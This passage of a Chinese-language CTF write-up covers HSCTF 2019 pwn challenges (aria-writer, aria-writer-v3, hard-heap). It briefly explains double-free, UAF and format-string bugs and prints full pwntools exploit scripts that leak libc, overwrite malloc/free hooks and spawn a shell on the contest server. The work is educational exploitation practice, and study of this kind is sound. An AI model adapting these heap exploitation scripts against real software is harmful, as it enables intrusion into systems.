hex(shell_addr))</span><br><span class="line">    <span class="comment">#first overwrite</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">'addr low low =&gt; '</span> + hex(addr_low_low))</span><br><span class="line">    payload = <span class="string">"aaaa%"</span>+str(addr_low_low<span class="number">-4</span>)+<span class="string">"c%26$hn"</span>+p64(chk_fail_addr)</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    payload = decode(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter text to be encoded: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter number of characters to shift: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#second</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">'addr low high =&gt; '</span> + hex(addr_low_high))</span><br><span class="line">    payload = <span class="string">"aaa%"</span>+str(addr_low_high<span class="number">-3</span>)+<span class="string">"c%26$hn"</span>+p64(chk_fail_addr+<span class="number">2</span>)</span><br><span class="line">    payload = decode(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter text to be encoded: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter number of characters to shift: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#third</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    log.success(<span class="string">'addr high =&gt; '</span> + hex(addr_high))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"aaa%"</span>+str(addr_high<span class="number">-3</span>)+<span class="string">"c%26$hn"</span>+p64(chk_fail_addr+<span class="number">4</span>)</span><br><span class="line">    payload = decode(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter text to be encoded: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter number of characters to shift: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x40143a')</span></span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    chars = <span class="number">0x401462</span></span><br><span class="line">    payload = <span class="string">"%"</span>+str(chars)+<span class="string">"c%26$lln"</span>+p64(puts_got)</span><br><span class="line">    payload = decode(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter text to be encoded: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter number of characters to shift: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="aria-writer"><a href="#aria-writer" class="headerlink" title="aria-writer"></a>aria-writer</h2><p>存在double free的漏洞，且有一个secret的选项可以输出name的值，先在name里构造0x90大小的fake_chunk，用double free+3次malloc修改0x90对应的tcache数量为0xff，从而free这个fake chunk的时候直接把其放入unsorted bin，再利用secret去泄露Libc，修改malloc_hook到gadgets即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./aria-writer'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">2222</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'whats your name &gt; '</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'what should i write tho &gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    name_addr = <span class="number">0x6020e0</span></span><br><span class="line">    global_addr = <span class="number">0x6020c0</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    name = p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)</span><br><span class="line">    name = name.ljust(<span class="number">0x90</span>,<span class="string">'a'</span>)</span><br><span class="line">    name += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">'b'</span>*<span class="number">0x10</span></span><br><span class="line">    name += p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    Init(name)</span><br><span class="line">    <span class="comment">#stage 1</span></span><br><span class="line">    Malloc(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">    Free()<span class="comment">#1</span></span><br><span class="line">    Free()<span class="comment">#2</span></span><br><span class="line">    Malloc(<span class="number">0x80</span>,p64(name_addr+<span class="number">0x10</span>))</span><br><span class="line">    Malloc(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">    Malloc(<span class="number">0x80</span>,<span class="string">'b'</span>)</span><br><span class="line">    Free()<span class="comment">#3</span></span><br><span class="line">    Show()</span><br><span class="line">    p.recvn(<span class="number">0x20</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">8</span>))<span class="number">-96</span><span class="number">-0x3ebc40</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    fake_chunk = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span> + <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">'fake chunk =&gt; '</span> + hex(fake_chunk))</span><br><span class="line">    <span class="comment">#tcache dup to get shell</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Malloc(<span class="number">0x70</span>,<span class="string">'libc_base'</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'aa'</span>)</span><br><span class="line">    Free()<span class="comment">#4</span></span><br><span class="line">    Free()<span class="comment">#5</span></span><br><span class="line">    <span class="keyword">print</span> hex(fake_chunk)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Malloc(<span class="number">0x60</span>,p64(fake_chunk))</span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr))</span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'17'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="aria-writer-v3"><a href="#aria-writer-v3" class="headerlink" title="aria-writer-v3"></a>aria-writer-v3</h2><p>这个题目是上一道的加强版，libc 2.27，依然有double free，但是没有泄露函数，观察之后发现bss段上存储了stdout结构体的地址，这里直接double free再分配到bss这个地址上，再次分配即可分配stdout，修改其内容即可泄露libc。之后的操作同之前一样。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./aria-writer-v3'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">2468</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'whats your name &gt; '</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'what should i write tho &gt; '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Gimme int pls &gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    name_addr = <span class="number">0x602048</span></span><br><span class="line">    curr_addr = <span class="number">0x602040</span></span><br><span class="line">    stdout_addr = <span class="number">0x602020</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Init(<span class="string">'wz'</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">    Free()</span><br><span class="line">    Free()</span><br><span class="line">    Malloc(<span class="number">0x60</span>,p64(stdout_addr))</span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'1'</span>)</span><br><span class="line">    log.success(<span class="string">'malloc stdout addr'</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>,<span class="string">'\x60'</span>)</span><br><span class="line">    log.success(<span class="string">'before success'</span>)</span><br><span class="line">    Malloc(<span class="number">0x60</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7f3e08d898b0</span><span class="number">-0x7f3e0899c000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'free hook addr =&gt; '</span> + hex(free_hook))</span><br><span class="line">    shell_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    log.success(<span class="string">'shell addr =&gt; '</span> + hex(shell_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Malloc(<span class="number">0x90</span>,<span class="string">'a'</span>)</span><br><span class="line">    Free()</span><br><span class="line">    Free()</span><br><span class="line">    Malloc(<span class="number">0x90</span>,p64(free_hook))</span><br><span class="line">    Malloc(<span class="number">0x90</span>,<span class="string">'b'</span>)</span><br><span class="line">    Malloc(<span class="number">0x90</span>,p64(shell_addr))</span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    Free()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    padding = 'a'*8</span></span><br><span class="line"><span class="string">    name = padding</span></span><br><span class="line"><span class="string">    name += p64(0)+p64(0x91)</span></span><br><span class="line"><span class="string">    name += 'a'*0x80</span></span><br><span class="line"><span class="string">    name += p64(0x0) + p64(0x21)+'b'*8+p64(0)</span></span><br><span class="line"><span class="string">    name += p64(0x20) + p64(0x21)</span></span><br><span class="line"><span class="string">    Init(name)</span></span><br><span class="line"><span class="string">    #stage 1</span></span><br><span class="line"><span class="string">    Malloc(0x80,'a')</span></span><br><span class="line"><span class="string">    Free()#1</span></span><br><span class="line"><span class="string">    Free()#2</span></span><br><span class="line"><span class="string">    Malloc(0x80,p64(name_addr+0x18))</span></span><br><span class="line"><span class="string">    Malloc(0x80,'a')</span></span><br><span class="line"><span class="string">    Malloc(0x80,'b')</span></span><br><span class="line"><span class="string">    Free()#3</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    #Show()</span></span><br><span class="line"><span class="string">    p.recvn(0x20)</span></span><br><span class="line"><span class="string">    libc_base = u64(p.recvn(8))-96-0x3ebc40</span></span><br><span class="line"><span class="string">    log.success('libc base =&gt; ' + hex(libc_base))</span></span><br><span class="line"><span class="string">    shell_addr = libc_base + gadgets[1]</span></span><br><span class="line"><span class="string">    fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23 + 0x10</span></span><br><span class="line"><span class="string">    log.success('fake chunk =&gt; ' + hex(fake_chunk))</span></span><br><span class="line"><span class="string">    #tcache dup to get shell</span></span><br><span class="line"><span class="string">    #gdb.attach(p)</span></span><br><span class="line"><span class="string">    Malloc(0x70,'libc_base')</span></span><br><span class="line"><span class="string">    Malloc(0x60,'aa')</span></span><br><span class="line"><span class="string">    Free()#4</span></span><br><span class="line"><span class="string">    Free()#5</span></span><br><span class="line"><span class="string">    print hex(fake_chunk)</span></span><br><span class="line"><span class="string">    #gdb.attach(p)</span></span><br><span class="line"><span class="string">    Malloc(0x60,p64(fake_chunk))</span></span><br><span class="line"><span class="string">    Malloc(0x60,'a')</span></span><br><span class="line"><span class="string">    Malloc(0x60,'a'*0x13+p64(shell_addr))</span></span><br><span class="line"><span class="string">    p.recvuntil('Gimme int pls &gt; ')</span></span><br><span class="line"><span class="string">    p.sendline('1')</span></span><br><span class="line"><span class="string">    p.recvuntil('Gimme int pls &gt; ')</span></span><br><span class="line"><span class="string">    p.sendline('17')</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="hard-heap"><a href="#hard-heap" class="headerlink" title="hard-heap"></a>hard-heap</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>这题是之前某个CTF题的变种，第一次学到这种利用方式，可以绕过size的要求。</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序有Malloc、Free和Show三个功能。</p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_1.jpg" alt="main"></p>
<p>在Malloc中，最多可以分配20个堆块。size[0]存储用户输入的size，要求小于等于0x48，size[1]存储canary防止溢出。全局数组0x202060[index]存储chunk地址，读取size[0]-1大小的数据进入chunk。</p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_2.jpg" alt="malloc"></p>
<p>Show里对Index做了检查，没有对数组内容做检查，存在UAF。</p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_3.jpg" alt="observe"></p>
<p>Free里有double free</p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_4.jpg" alt="free"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这题开始我以为是2.27的题，还是蛮好做的，到2.23因为malloc的size会有检查，导致之前的思路完全不通。这里用的知识是fast bin和top chunk的地址会存储在main_arena里，如果我们可以修改main_arena，就可以控制fast bin和top chunk的值</p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_5.jpg" alt="main_arena"></p>
<p>观察main_arena的内容，可以看到main_arena+8+5刚好可以凑一个大小为0x56的fake chunk出来。</p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_6.jpg" alt="main+arena"></p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_7.jpg" alt="main+arena1"></p>
<p>首先，我们利用double free泄露出heap基址。在某个chunk中构造fake chunk，用刚才的double free分配到这个fake chunk，进而通过输入覆写下面的chunk的prev_size和size(0x91)。将其释放之后即可泄露libc。</p>
<p>程序开了地址随机化，因此heap的第一个字节为0x55或0x56，我们需要绕过检查，因此要等0x56的情况出现。我们将之前申请的0x30的chunk释放，main_arena的对应地址出现了值，再用0x48的double free分配到这个fake chunk。之后我们修改fastbins[0x50]的值为main_arena+0x20，fastbins[0x60]的值为0x51。Malloc(0x48)即可分配到main_arena+0x20的大小为0x50的块，input改掉top_chunk为malloc_hook附近的值(这里为malloc_hook-0x15)，再分配一个块即可覆写malloc_hook为shell_addr。</p>
<p><img src="/2020/09/03/HSCTF2019/hard_heap_8.jpg" alt="top_chunk"></p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><p>因为写了2.27的，就顺便也发出来了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#2.27</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./hard-heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    libc_offset = <span class="number">0x3ebc40</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">5555</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'c'</span>)<span class="comment">#2</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'d'</span>)<span class="comment">#3</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'d'</span>)<span class="comment">#4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Free(<span class="number">0</span>)</span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line">    offset = <span class="number">0x260</span></span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - offset</span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#overlap chunk to change size</span></span><br><span class="line">    Malloc(<span class="number">0x40</span>,<span class="string">'d'</span>)<span class="comment">#5</span></span><br><span class="line">    Free(<span class="number">5</span>)</span><br><span class="line">    Free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    chunk1_addr = heap_base + <span class="number">0x2a0</span></span><br><span class="line">    Malloc(<span class="number">0x40</span>,p64(chunk1_addr))<span class="comment">#6</span></span><br><span class="line">    Malloc(<span class="number">0x40</span>,<span class="string">'e'</span>)<span class="comment">#7</span></span><br><span class="line">    Malloc(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>))<span class="comment">#8 overwrite the size of chunk2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Free(<span class="number">2</span>)</span><br><span class="line">    Show(<span class="number">2</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    shell_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    Malloc(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#9</span></span><br><span class="line">    Free(<span class="number">9</span>)</span><br><span class="line">    Free(<span class="number">9</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Malloc(<span class="number">0x20</span>,p64(free_hook))<span class="comment">#10</span></span><br><span class="line">    Malloc(<span class="number">0x20</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#11</span></span><br><span class="line">    Malloc(<span class="number">0x20</span>,p64(shell_addr))</span><br><span class="line">    Free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<p>And 2.23</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#2.23</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./hard-heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">5555</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">    gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>))<span class="comment">#1</span></span><br><span class="line">    Malloc(<span class="number">0x40</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    Malloc(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#4 in case to covered by top_chunk</span></span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x40</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    fake_chunk_addr = heap_base + <span class="number">0x70</span> <span class="comment">#try fake chunk to be chunk1</span></span><br><span class="line">    log.success(<span class="string">'fake chunk addr =&gt; '</span> + hex(fake_chunk_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">0x30</span>,p64(fake_chunk_addr))<span class="comment">#5</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'b'</span>)<span class="comment">#6</span></span><br><span class="line">    Malloc(<span class="number">0x30</span>,<span class="string">'c'</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">    Malloc(<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))<span class="comment">#8 overwrite the size</span></span><br><span class="line"></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span 